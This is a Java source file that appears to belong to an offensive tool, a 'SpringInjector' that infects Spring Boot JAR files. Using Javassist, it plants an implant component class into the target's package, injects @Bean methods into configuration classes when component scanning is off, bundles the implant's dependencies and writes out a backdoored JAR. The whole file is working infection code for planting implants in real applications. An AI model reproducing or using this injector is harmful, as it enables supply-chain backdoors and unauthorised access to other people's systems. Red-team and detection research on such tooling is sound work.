package org.example.injector;

import javassist.bytecode.*;
import javassist.bytecode.annotation.Annotation;
import javassist.bytecode.annotation.MemberValue;

import java.io.DataInputStream;
import java.io.IOException;
import java.nio.file.Path;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.logging.Logger;
import java.util.zip.ZipException;

import static org.example.injector.Helpers.*;

public class SpringInjector {
    private final static Logger log = Logger.getLogger("SpringInjector");
    private final ImplantHandler implantComponentHandler;
    private final ImplantHandler implantSpringConfigHandler;

    public SpringInjector(ImplantHandler implantComponentHandler, ImplantHandler implantSpringConfigHandler) {
        this.implantComponentHandler = implantComponentHandler;
        this.implantSpringConfigHandler = implantSpringConfigHandler;
    }

    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
        boolean didInfect = false;
        boolean foundSignedClasses = false;

        if (jarLooksSigned(targetJarFilePath)) {
            log.warning("JAR looks signed. This is not yet implemented. Aborting.");
            return false;
        }

        BufferedJarFiddler fiddler = BufferedJarFiddler.read(targetJarFilePath);
        int countConfigModifications = 0;
        int countComponentsCreated = 0;
        for (BufferedJarFiddler.BufferedJarEntry entry : fiddler) {
            if (!entry.getName().endsWith(".class")) {
                continue;
            }
            if (entry.toJarEntry().getCodeSigners() != null) {
                foundSignedClasses = true;
                continue;
            }

            ClassFile currentlyProcessing;
            try (DataInputStream in = new DataInputStream(entry.getContentStream())) {
                currentlyProcessing = new ClassFile(in);
                if (!isSpringConfigurationClass(currentlyProcessing)) {
                    continue;
                }
                log.fine("Found Spring configuration '" + entry.getName() + "'.");

                /*
                 * By adding our own Spring component (like a RestController) into the JAR under the same package
                 * as the Spring config class, Spring will happily load it automatically. This is assuming that
                 * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
                 * component needs to be explicitly referenced as a @Bean in the config class.
                 */
                ClassFile implantComponent = implantComponentHandler.loadFreshConfiguredSpecimen();
                String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
                implantComponent.setName(targetPackageName + "." + implantComponentClassName);
                JarEntry newJarEntry = convertToSpringJarEntry(implantComponent);
                try {
                    fiddler.addNewEntry(newJarEntry, asByteArray(implantComponent));
                    countComponentsCreated++;
                } catch (ZipException e) {
                    // QUICKFIX: The entry most likely already exist in the ZIP file
                    log.warning("Class '" + newJarEntry + "' already exist in JAR '" + outputJar + "'. Skipping.");
                    continue;
                    // TODO This is _not_ a solid way of moving on. The actual class in the JAR could be something else than implantComponent.
                }
                log.fine("Created implant class '" + newJarEntry.getName() + "'.");

                if (!hasComponentScanEnabled(currentlyProcessing)) {
                    /*
                     * Component Scanning seems to not be enabled for this Spring configuration.
                     * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
                     */
                    log.fine("Spring configuration '" + entry.getName() + "' is not set to automatically scan for components (@ComponentScan).");

                    ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
                    if (!addBeanToSpringConfig(currentlyProcessing, implantComponent, implantSpringConfig)) {
                        log.warning("Class '" + entry.getName() + "' already infected. Skipping.");
                        continue;
                    }

                    entry.replaceContentWith(asByteArray(currentlyProcessing));
                    countConfigModifications++;
                    log.fine("Injected @Bean method into '" + entry.getName() + "'.");
                }

                didInfect = true;
            } catch (ClassNotFoundException e) {
                throw new RuntimeException(e);
            }
        }
        log.info("Modified " + countConfigModifications + " Spring configuration classes.");
        log.info("Created " + countComponentsCreated + " Spring component classes.");

        if (foundSignedClasses) {
            log.warning("Found signed classes. These were not considered for infection.");
        }

        // Add any dependency classes needed for the implant
        if (didInfect) {
            Map<String, byte[]> allDependencies = new HashMap<>();
            allDependencies.putAll(implantSpringConfigHandler.getDependencies());
            allDependencies.putAll(implantComponentHandler.getDependencies());
            // Since this injector involves two different implant handlers, do a bit of manual exclusion of themselves
            allDependencies.remove(convertToJarEntryPathName(implantSpringConfigHandler.getImplantClassName()));
            allDependencies.remove(convertToJarEntryPathName(implantComponentHandler.getImplantClassName()));
            // Also note that the dependencies are not renamed in any way
            // Any custom classes bundled with the implant will contain the whole package name etc

            for (Map.Entry<String, byte[]> dependencyEntry : allDependencies.entrySet()) {
                String fileName = dependencyEntry.getKey();
                byte[] fileContent = dependencyEntry.getValue();

                JarEntry newJarEntry = new JarEntry("BOOT-INF/classes/" + fileName);
                try {
                    fiddler.addNewEntry(newJarEntry, fileContent);
                } catch (ZipException e) {
                    // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
                    log.severe("Dependency file '" + fileName + "' already exist. Aborting.");
                    didInfect = false;
                    break;
                }
            }
        }

        if (didInfect) {
            fiddler.write(outputJar);
            log.info("Wrote output JAR to '" + outputJar + "'.");
        } else {
            log.warning("No output JAR was written.");
        }

        return didInfect;
    }

    static boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantSpringConfig, ClassFile implantComponent) throws ClassNotFoundException {
        String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
        String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
        String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());

        // Copy all @Bean annotated methods from implant config class to target config class (if not already exists)
        for (MethodInfo implantBeanMethod : findAllSpringBeanMethods(implantSpringConfig)) {
            MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(implantBeanMethod.getName());
            if (existingImplantControllerBean != null) {
                return false;
            }

            try {
                Map<String, String> translateTable = new HashMap<>();
                translateTable.put(implantPackageDesc + "/" + implantComponentClassName, targetPackageDesc + "/" + implantComponentClassName);
                translateTable.put(convertToClassFormatFqcn(implantSpringConfig.getName()), convertToClassFormatFqcn(existingSpringConfig.getName()));

                String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
                MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
                targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist

                CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
                codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
                targetBeanMethod.setCodeAttribute(codeAttr);

                ExceptionsAttribute exceptionsAttr = implantBeanMethod.getExceptionsAttribute();
                if (exceptionsAttr != null) {
                    ExceptionsAttribute exceptions = (ExceptionsAttribute) exceptionsAttr.copy(existingSpringConfig.getConstPool(), translateTable);
                    targetBeanMethod.setExceptionsAttribute(exceptions);
                }

                copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);

                existingSpringConfig.addMethod(targetBeanMethod);
            } catch (DuplicateMemberException e) {
                throw new RuntimeException(e);
            }
        }

        return true;
    }

    // Copy all annotations from implant method to target method. Notice the const pools!
    static void copyAllMethodAnnotations(MethodInfo target, final MethodInfo source) {
        AttributeInfo sourceAttr = source.getAttribute("RuntimeVisibleAnnotations");
        if (sourceAttr == null) {
            // The source method does not have any annotations. Is this fine?
            return;
        }
        if (!(sourceAttr instanceof AnnotationsAttribute sourceAnnotationsAttr)) {
            throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
        }

        AnnotationsAttribute targetAnnotationsAttr = new AnnotationsAttribute(target.getConstPool(), "RuntimeVisibleAnnotations");

        // Retain any annotations that are already at the target method
        AttributeInfo alreadyExistingAnnotationsAttr = target.getAttribute("RuntimeVisibleAnnotations");
        if (alreadyExistingAnnotationsAttr != null) {
            Annotation[] existingAnnotations = ((AnnotationsAttribute) alreadyExistingAnnotationsAttr).getAnnotations();
            for (Annotation existingAnnotation : existingAnnotations) {
                targetAnnotationsAttr.addAnnotation(existingAnnotation);
            }
        }

        // Add the new annotations from the source method
        for (Annotation annotation : sourceAnnotationsAttr.getAnnotations()) {
            Annotation copiedAnnotation = new Annotation(annotation.getTypeName(), target.getConstPool());
            if (annotation.getMemberNames() != null) {
                for (String memberValueName : annotation.getMemberNames()) {
                    MemberValue memberValue = annotation.getMemberValue(memberValueName);
                    copiedAnnotation.addMemberValue(memberValueName, memberValue);
                }
            }
            targetAnnotationsAttr.addAnnotation(copiedAnnotation);
        }

        target.addAttribute(targetAnnotationsAttr);
    }

    private static List<MethodInfo> findAllSpringBeanMethods(ClassFile springController) {
        List<MethodInfo> results = new ArrayList<>(1);

        for (MethodInfo method : springController.getMethods()) {
            AttributeInfo attr = method.getAttribute("RuntimeVisibleAnnotations");
            if (attr == null) {
                continue;
            }
            if (!(attr instanceof AnnotationsAttribute annotationAttr)) {
                throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
            }

            for (Annotation annotation : annotationAttr.getAnnotations()) {
                String annotationType = annotation.getTypeName();
                if (annotationType.equals("org.springframework.context.annotation.Bean")) {
                    results.add(method);
                }
            }
        }

        return results;
    }

    private static boolean isSpringConfigurationClass(final ClassFile classFile) {
        List<Annotation> springAnnotations = classFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(SpringInjector::isAnySpringContextAnnotation)
                )
                .toList();
        return !springAnnotations.isEmpty();
    }

    private static boolean isAnySpringContextAnnotation(final Annotation annotation) {
        return switch (annotation.getTypeName()) {
            case "org.springframework.boot.autoconfigure.SpringBootApplication" -> true;
            case "org.springframework.context.annotation.Configuration" -> true;
            default -> false;
        };
    }

    private static boolean hasComponentScanEnabled(final ClassFile springContextClassFile) {
        Set<String> annotationsThatActivatesComponentScanning = Set.of(
                "org.springframework.context.annotation.ComponentScan",
                "org.springframework.boot.autoconfigure.SpringBootApplication"
        );

        List<Annotation> componentScanAnnotations = springContextClassFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(annotation -> annotationsThatActivatesComponentScanning.contains(annotation.getTypeName()))
                )
                .toList();
        return !componentScanAnnotations.isEmpty();
    }
}
